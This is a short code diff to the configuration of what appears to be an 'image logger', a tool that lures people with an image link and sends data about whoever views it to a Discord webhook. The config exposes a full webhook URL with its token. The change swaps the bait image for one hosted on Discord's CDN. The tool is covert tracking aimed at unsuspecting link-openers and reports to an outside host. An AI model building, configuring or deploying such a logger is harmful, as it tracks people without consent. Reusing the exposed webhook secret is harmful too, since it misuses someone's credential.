@@ -13,7 +13,7 @@ __author__ = "Jelle_0546"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1429488751276720311/UEZmePDb-ph2WFcE7bBHvIyh4UH-IceyPMyGpENE7Vaf3I3onaeV5FDdz0ZK2zbnqVV8",
-    "image": "https://www.zelst.nl/media/catalog/product/cache/0bc127bc847f58ae277a81ddecf2174b/f/r/fristi_fles_1.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1421173815689478167/1429508227309113344/OIP.png?ex=68f664c8&is=68f51348&hm=aedd0e15c26ede56b6064d5ffedbbf153e77803b9831e8c1d2f55809f4368b7b&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
